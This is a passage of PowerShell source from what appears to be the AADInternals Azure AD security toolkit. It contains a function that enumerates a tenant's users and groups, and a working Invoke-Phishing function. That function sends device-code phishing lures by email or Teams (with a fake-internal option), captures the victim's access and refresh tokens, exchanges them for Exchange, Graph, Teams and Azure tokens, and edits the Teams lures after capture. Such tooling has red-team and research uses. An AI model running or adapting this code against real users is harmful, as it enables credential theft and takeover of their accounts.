        $tenantInformation |Add-Member -NotePropertyName "partnerContracts"       -NotePropertyValue $partnerContracts
        $tenantInformation |Add-Member -NotePropertyName "partnerOrganisations"   -NotePropertyValue $partnerOrganisations
        $tenantInformation |Add-Member -NotePropertyName "partners"               -NotePropertyValue $partners
        $tenantInformation |Add-Member -NotePropertyName "partnerRoleInformation" -NotePropertyValue $partnerRoleInformation

        # Print out some relevant information
        Write-Host "Tenant brand:                $($tenantInformation.displayName)"
        Write-Host "Tenant name:                 $($tenantInformation.domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id)"
        Write-Host "Tenant id:                   $tenantId"
        Write-Host "Tenant SKU:                  $($tenantSku -join ", ")"
        Write-Host "Azure AD objects:            $($tenantInformation.directorySizeQuota.used)/$($tenantInformation.directorySizeQuota.total)"
        Write-Host "Domains:                     $($tenantInformation.domains.Count) ($(($tenantInformation.domains | Where-Object isVerified -eq "True").Count) verified)"
        Write-Host "Non-admin users restricted?  $($tenantInformation.restrictNonAdminUsers)"
        Write-Host "Users can register apps?     $($tenantInformation.usersCanRegisterApps)"
        Write-Host "Directory access restricted? $($tenantInformation.restrictDirectoryAccess)"
        Write-Host "Directory sync enabled?      $($tenantInformation.companyInformation.DirectorySynchronizationEnabled)"
        Write-Host "Global admins:               $(@($tenantInformation.roleInformation | Where-Object ObjectId -eq "62e90394-69f5-4237-9190-012177145e10" | Select-Object -ExpandProperty Members).Count)" 
        Write-Host "CA policies:                 $($tenantInformation.conditionalAccessPolicy.Count)" 
        Write-Host "MS Partner IDs:              $(($tenantInformation.partnerOrganisations | Where-Object typeName -Like "Partner*" ).MPNID -join ",")"             
        Write-Host "MS Partner DAP enabled?      $($tenantInformation.partnerDAPEnabled)"
        Write-Host "MS Partner contracts:        $($tenantInformation.partnerContracts.Count)"             
        Write-Host "MS Partners:                 $($tenantInformation.partners.Count)"
            

        # Return
        return $tenantInformation

    }
}

# Starts crawling the organisation for user names and groups
# Jun 16th 2020
function Invoke-UserEnumerationAsInsider
{
<#
    .SYNOPSIS
    Dumps user names and groups of the tenant.

    .DESCRIPTION
    Dumps user names and groups of the tenant.
    By default, the first 1000 users and groups are returned. 

    Groups:       Include groups
    GroupMembers: Include members of the groups (not recommended)
        
    GroupId:      Id of the group. If this is given, only one group and members are included. 

    .Example
    C:\PS>$results = Invoke-AADIntUserEnumerationAsInsider

    Users:        5542
    Groups:        212

    C:\PS>$results.Users[0]

    id                              : 7ab0eb51-b7cb-4ff0-84ec-893a413d7b4a
    displayName                     : User Demo
    userPrincipalName               : User@company.com
    onPremisesImmutableId           : UQ989+t6fEq9/0ogYtt1pA==
    onPremisesLastSyncDateTime      : 2020-07-14T08:18:47Z
    onPremisesSamAccountName        : UserD
    onPremisesSecurityIdentifier    : S-1-5-21-854168551-3279074086-2022502410-1104
    refreshTokensValidFromDateTime  : 2019-07-14T08:21:35Z
    signInSessionsValidFromDateTime : 2019-07-14T08:21:35Z
    proxyAddresses                  : {smtp:User@company.onmicrosoft.com, SMTP:User@company.com}
    businessPhones                  : {+1234567890}
    identities                      : {@{signInType=userPrincipalName; issuer=company.onmicrosoft.com; issuerAssignedId=User@company.com}} 



#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [int] $MaxResults=1000,
        [switch] $Groups,
        [switch] $GroupMembers,
        [Parameter(Mandatory=$False)]
        [String]$GroupId
    )
    Begin
    {
    }
    Process
    {
        # Get access token from cache
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

         # Create a new AccessToken for graph.microsoft.com
        $refresh_token = Get-RefreshTokenFromCache -AccessToken $AccessToken
        if([string]::IsNullOrEmpty($refresh_token))
        {
            throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
        }
        # MSGraph Access Token
        $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId (Read-Accesstoken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true

        # Get the users and some relevant information
        if([String]::IsNullOrEmpty($GroupId))
        {
            $users = Call-MSGraphAPI -MaxResults $MaxResults -AccessToken $AccessToken -API "users" -ApiVersion "v1.0" -QueryString "`$select=id,displayName,userPrincipalName,userType,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesSamAccountName,onPremisesSecurityIdentifier,onPremisesDistinguishedName,refreshTokensValidFromDateTime,signInSessionsValidFromDateTime,proxyAddresses,businessPhones,identities"
        }

        # Get the groups
        if($Groups -or $GroupMembers -or $GroupId)
        {
            $groupsAPI="groups"
            $groupQS = ""
            if($GroupMembers -or $GroupId)
            {
                $groupQS="`$expand=members"
            }
            if($GroupId)
            {
                $groupsAPI="groups/$GroupId/"
            }
            $groupResults = Call-MSGraphAPI -MaxResults $MaxResults -AccessToken $AccessToken -API $groupsAPI -ApiVersion "v1.0" -QueryString $groupQS
        }
        $attributes=@{
            "Users" =  $users
            "Groups" = $groupResults
        }

        # Print out some relevant information
        Write-Host "Users:        $($Users.count)"
        Write-Host "Groups:       $(if($GroupId -and $groupResults -ne $null){1}else{$groupResults.count})"

        # Return
        New-Object psobject -Property $attributes
    }
}

# Sends phishing email to given recipients
# Oct 13th 2020
function Invoke-Phishing
{
<#
    .SYNOPSIS
    Sends phishing mail to given recipients and receives user's access token

    .DESCRIPTION
    Sends phishing mail to given recipients and receives user's access token using device code authentication flow.

    .Parameter Tenant
    Tenant id of tenant used for authentication. Defaults to "Common"

    .Parameter Tenant
    Tenant id of tenant used for authentication. Defaults to "Common"

    .Parameter Recipients
    Comma separated list of recipient emails

    .Parameter Subject
    Subject of the email

    .Parameter Sender
    Sender of the email. Supports the plain email "user@example.com" and display name "Some User <user@example.com" formats 

    .Parameter SMTPServer
    Ip address or FQDN of the SMTP server used to send the email

    .Parameter SMTPCredentials
    Credentials used to authenticate to SMTP server

    .Parameter Message
    An html message to be sent to recipients. Uses string formatting to insert url and user code.
    {0} = user code
    {1} = signing url

    Default message:
    '<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'

    .Parameter CleanMessage
    An html message used to replace the original Teams message after the access token has been received.

    Default message:
    '<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'

    .Parameter Teams
    Switch indicating that Teams is used for sending phishing messages.

    .Example
    $tokens = Invoke-AADIntPhishing -Recipients svictim@company.com -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local 

    Code: CKDZ2BURF
    Mail sent to: wvictim@company.com
    ...
    Received access token for william.victim@company.com

    .Example
    $tokens = Invoke-AADIntPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -SaveToCache

    Code: CKDZ2BURF
    Mail sent to: wvictim@company.com
    Mail sent to: wvictim2@company.com
    ...
    Received access token for william.victim@company.com

    PS C:\>$results = Invoke-AADIntReconAsInsider

    Tenant brand:                company.com
    Tenant name:                 company.onmicrosoft.com
    Tenant id:                   d4e225d6-8877-4bc6-b68c-52c44011ba81
    Azure AD objects:            147960/300000
    Domains:                     5 (5 verified)
    Non-admin users restricted?  True
    Users can register apps?     True
    Directory access restricted? False
    Directory sync enabled?      true
    Global admins                10

    .Example
    PS C:\>Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

    PS C:\>$tokens = Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams 
    
    ```
    Code: CKDZ2BURF
    Teams message sent to: wvictim@company.com. Message id: 132473151989090816
    ...
    Received access token for william.victim@company.com
    
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$Tenant="Common",
        [Parameter(Mandatory=$True)]
        [String[]]$Recipients,
        [Parameter(Mandatory=$False)]
        [String]$Message='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>',

        [Parameter(ParameterSetName='Teams',Mandatory=$True)]
        [Switch]$Teams,
        [Parameter(ParameterSetName='Teams',Mandatory=$False)]
        [String]$CleanMessage='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>',
        [Parameter(ParameterSetName='Teams')]
        [switch]$External,
        [Parameter(ParameterSetName='Teams')]
        [switch]$FakeInternal,

        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$Subject,
        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$Sender,
        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$SMTPServer,
        [Parameter(ParameterSetName='Mail',Mandatory=$False)]
        [System.Management.Automation.PSCredential]$SMTPCredentials,

        [Switch]$SaveToCache
        
    )
    Begin
    {
        # Choises
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""#%&/()=?*+-_"
    }
    Process
    {
        if($Teams)
        {
            # Get access token from cache
            $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

            # If external, use the target tenant id
            if($External)
            {
                $Tenant = Get-AADIntTenantID -UserName $Recipients[0]
            }

            # Get the list of tenants the user has access to if not provided
            if([string]::IsNullOrEmpty($Tenant))
            {
                $tenants = Get-AzureTenants -AccessToken $AccessToken
                $tenantNames = $tenants | Select-Object -ExpandProperty Name

                # Prompt for tenant choice if more than one
                if($tenantNames.count -gt 1)
                {
                    $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
                    for($p=0; $p -lt $tenantNames.count; $p++)
                    {
                        $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
                    }
                    $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
                }
                else
                {
                    $opt=0
                }
                $tenantInfo = $tenants[$opt]
                $tenant =     $tenantInfo.Id
            }

            # Create a new AccessToken for graph.microsoft.com
            $refresh_token = Get-RefreshTokenFromCache -ClientID "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://management.core.windows.net"
            if([string]::IsNullOrEmpty($refresh_token))
            {
                throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
            }
            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId (Read-AccessToken -AccessToken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true
        }

        # Create a body for the first request. We'll be using client id of "Microsoft Office"
        $clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        $body=@{
            "client_id" = $clientId
            "resource" =  "https://graph.windows.net"
        }

        # Invoke the request to get device and user codes
        $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$tenant/oauth2/devicecode?api-version=1.0" -Body $body

        Write-Host "Code: $($authResponse.user_code)"
        
        # Format the message        
        $message=[string]::Format($message,$authResponse.user_code,$authResponse.verification_url)
        
        # Send messages
        $teamsMessages=@()
        foreach($recipient in $Recipients)
        {
            if($Teams)
            {
                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html -External $External -FakeInternal $FakeInternal
                Write-Host "Teams message sent to: $Recipients. ClientMessageId: $($msgDetails.ClientMessageId)"
                $msgDetails | Add-Member -NotePropertyName "Recipient" -NotePropertyValue $recipient
                $teamsMessages += $msgDetails
            }
            else
            {
                Send-MailMessage -from $Sender -to $recipient -Subject $Subject -Body $message -SmtpServer $SMTPServer -BodyAsHtml -Encoding utf8
                Write-Host "Mail sent to: $recipient"
            }
        }
        

        $continue = $true
        $interval = $authResponse.interval
        $expires =  $authResponse.expires_in

        # Create body for authentication subsequent requests
        $body=@{
            "client_id" =  $ClientId
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
            "resource" =   $Resource
        }

        # Loop while authorisation pending or until timeout exceeded
        while($continue)
        {
            Start-Sleep -Seconds $interval
            $total += $interval

            if($total -gt $expires)
            {
                Write-Error "Timeout occurred"
                return
            }
                        
            # Try to get the response. Will give 400 while pending so we need to try&catch
            try
            {
                $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
            }
            catch
            {
                # This normal flow, always returns 400 unless successful
                $details=$_.ErrorDetails.Message | ConvertFrom-Json
                $continue = $details.error -eq "authorization_pending"
                Write-Verbose $details.error
                Write-Host "." -NoNewline

                if(!$continue)
                {
                    # Not pending so this is a real error
                    Write-Error $details.error_description
                    return
                }
            }

            # If we got response, all okay!
            if($response)
            {
                Write-Host "" # new line
                break # Exit the loop
            }
        }

        # Dump the name
        $user = (Read-Accesstoken -AccessToken $response.access_token).upn
        if([String]::IsNullOrEmpty($user))
        {
            $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
        }
        Write-Host "Received access token for $user"

        # Clear the teams messages
        foreach($msg in $teamsMessages)
        {
            Send-TeamsMessage -AccessToken $AccessToken -ClientMessageId $msg.ClientMessageId -Message $CleanMessage -Html | Out-Null
        }

        # Save the tokens to cache
        if($SaveToCache)
        {
            Write-Verbose "ACCESS TOKEN: SAVE TO CACHE"
			Add-AccessTokenToCache -AccessToken $response.access_token -RefreshToken $response.refresh_token -ShowCache $false
        }
        
        # Create the return hashtable
        $attributes = @{
            "AADGraph" =         $response.access_token
            "refresh_token" =    $response.refresh_token
            "EXO" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office365.com"        -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
            "OWA" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office.com"           -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
            "Substrate" =        Get-AccessTokenWithRefreshToken -Resource "https://substrate.office.com"         -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
            "MSGraph" =          Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com"          -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
            "AZCoreManagement" = Get-AccessTokenWithRefreshToken -Resource "https://management.core.windows.net/" -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
            "Teams" =            Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com"         -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        }

        # Return
        if(!$SaveToCache)
        {
            return New-Object psobject -Property $attributes
        }
        
    }
}
